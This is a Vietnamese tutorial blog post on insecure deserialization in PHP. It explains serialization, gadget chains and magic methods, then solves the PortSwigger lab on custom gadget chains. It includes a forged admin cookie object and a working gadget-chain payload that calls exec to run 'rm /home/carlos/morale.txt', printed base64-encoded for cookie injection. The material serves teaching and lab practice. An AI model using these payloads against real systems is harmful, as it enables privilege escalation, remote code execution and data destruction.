![image](https://hackmd.io/_uploads/S1dT70jBC.png)

# Tổng quan về Insecure Deserialize (Phần 1)
Hôm nay chúng ta sẽ cùng tìm hiểu về Insecure Deserialize và tìm hiểu tại sao nó lại luôn là một trong những lỗ hổng "tiềm tàng" trong TOP 10 OWASP.
## Serialization và deserialization là gì?
Trong lập trình nhất là khi cần chuyển các dữ liệu giữa các thành phần ứng dụng với nhau hoặc để lưu trữ các dữ liệu rồi chuyển lại thành các dữ liệu sử dụng được mà không làm mất đi trạng thái của chúng.

![image](https://hackmd.io/_uploads/SJU5n1hHC.png)

### Serialization
Là quá trình chuyển các cấu trúc dữ liệu phức tạp thành một chuỗi byte (stream of bytes) có thể truyền đi hoặc ghi dưới dạng file.

Khi được serialize thì objects được giữ nguyên trạng thái cùng với giá trị mà nó được gán.

**Serialization cho phép:**
1. Ghi các dữ liệu phức tạp vào file, databases, Inter-Process Memory.
2. Gửi dữ liệu thông qua mạng, các thành phần khác của ứng dụng (hoặc NNLT khác), API call.

### Deserialization
Là quá trình ngược lại so với serialization. Chuyển các stream of bytes thành các objects mà NNLT hay các thành phần ứng dụng có thể hiểu và sử dụng được.

## Khi nào xảy ra insecure deserialization?
Insecure deserialization hay objects injection là lỗi xảy ra khi attacker có thể control được data được deserialize bởi website. Khi đó attacker có thể lợi dụng các **Gadget chains** (sẽ được giới thiệu ở phần sau) để thực thi các đoạn code độc hại mà người sở hữu website không mong muốn.

Hiện nay vẫn còn rất nhiều cuộc tấn công về Deserialization Attack. Lí do cho việc đó là các payload tấn công đã được thực thi trước cả quá trình Deserialize trong mã nguồn của website trong khi dev thường kiểm tra các output sau khi dữ liệu đã được deserialize.

Trong những ứng dụng lớn khi người lập trình muốn "snapshot" những trạng thái của một quá trình hay dữ liệu nào đó thì họ thường sẽ chọn những giải pháp như serialize -> bug.

Việc phát hiện ra lỗ hổng liên quan đến insecure deserialization cũng rất dễ có thể kể đến như các đoạn PHP Objects `O:4:"User":2:{s:4:"name":s:6:"carlos"; s:10:"isLoggedIn":b:1;}` hoặc những đoạn object serialized bắt đầu bằng `ac ed` trong mã HEX và `rO0` trong Java.

## Làm sao để khai thác insecure deserialization?

### **Để khai thác được lỗ hổng này ta cần các điều kiện sau:**
* User-Controlled Input: Ta phải thao túng được các trường trong data serialize để inject các dữ liệu độc hại vào chương trình.
* Vulnerable Classes/Libraries: Chương trình chứa những class hoặc library cho phép ta tạo thành các gadget chain phục vụ cho mục đích khai thác.

**Gadget chains là gì?**
Gadget là những phần nhỏ của code (method, function, class) giúp kẻ tấn công có thể đạt được mục tiêu bằng cách sử dụng hoặc ghép nối thành một chuỗi gadget.

![image](https://hackmd.io/_uploads/Sk73dZy8A.png)

### **Magic methods**
Là những phương thức "ma thuật" chỉ được gọi trước những sự kiên hoạt hoàn cảnh cụ thể.

Tham khảo: https://www.php.net/manual/en/language.oop5.magic.php#object.tostring

Ở phần này ta sẽ tập trung khai thác PHP insecure deserialization.

```php
<?php
class User {
    public $username;
    public $isAdmin = false;

    public function __construct($username) {
        $this->username = $username;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Welcome, admin!";
        } else {
            echo "Hello, $this->username!";
        }
    }
}

if (isset($_COOKIE['data']) && $_COOKIE['data'] != null) {
    $data = $_COOKIE['data'];
    $object = unserialize(base64_decode($data));
} else {
    $user = new User("John Doe");
    $data = serialize($user);
    setcookie("data", base64_encode($data), time() + (86400 * 30), "/");
    header("Location: deser.php");
}

?>
```

Ta thấy rằng đoạn code này có GET param là data nhận vào một đoạn base64 là chuỗi serialize ta có thể bypass và trở thành admin bằng cách thay đổi giá trị isAdmin = true

```php
<?php
class User {
    public $username;
    public $isAdmin = true;
}

$exploit = new User('attacker');
echo base64_encode(serialize($exploit));
// Result: Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtOO3M6NzoiaXNBZG1pbiI7YjoxO30=
?>
```

## Thực hành làm lab của PortSwigger để hiểu rõ hơn về custom gadget chains
**Lab: Developing a custom gadget chain for PHP deserialization**

Đầu tiên khi mở lab lên view-source ta thấy rằng web có một comment khả nghi
![image](https://hackmd.io/_uploads/HJ4UCSJ8A.png)
*/cgi-bin/libs/CustomTemplate.php* để có thể xem source code ta có thể thử thêm `s` hoặc `~` ký tự thường dùng để xem các backup source file.
Như trên thì khi ta thêm ~ vào /cgi-bin/libs/CustomTemplate.php~ thì ta sẽ có source code như sau

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```
Bên cạnh đó trong phần cookie session ta còn được một chuỗi serialize `O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"n4o2f445h2eae87u94elevg5dp26hyfv";}`

Phân tích sơ qua đoạn code ta thấy rằng tại class DefaultMap có magic method `__get()` và hàm `call_user_func()` đây là hàm dùng để gọi bất kỳ function nào.

Một điều đặt biệt nữa là `__get()` chỉ được thực thi khi ta truy cập một thuộc tính private bên ngoài class hoặc không tồn tại thuộc tính đó và để ý class Product có `$this->desc = $desc->$default_desc_type;` sẽ ra sao nếu ta truyền vào một chuỗi? -> điều đó sẽ khiến `__get()` được gọi và ta sẽ có thể thực thi được `call_user_func()`

```php
<?php

class CustomTemplate
{
    public $default_desc_type;
    public $desc;

    public function __construct($default_desc_type, $desc)
    {
        $this->default_desc_type = $default_desc_type;
        $this->desc = $desc;
    }
}

class DefaultMap
{
    public $callback;

    public function __construct($callback)
    {
        $this->callback = $callback;
    }
}

$defaultmap = new DefaultMap('exec');
$custom = new CustomTemplate('rm /home/carlos/morale.txt', $defaultmap);
echo base64_encode(serialize($custom));
// Result: TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319
```

Inject to session cookie and we solved the lab.

![image](https://hackmd.io/_uploads/H1qYLIyIA.png)
